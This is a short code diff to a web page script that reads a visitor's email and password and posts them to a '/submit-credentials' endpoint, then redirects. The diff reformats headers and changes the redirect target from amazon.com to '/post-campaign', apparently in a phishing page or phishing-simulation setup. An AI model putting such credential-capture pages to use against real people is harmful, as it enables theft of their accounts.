@@ -41,10 +41,12 @@
       const password = document.querySelector('input[name="password"]').value;
       fetch("/submit-credentials", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify({ email, password })
       }).finally(() => {
-        window.location.href = "https://amazon.com";
+        window.location.href = "/post-campaign";
       });
     }
   </script>
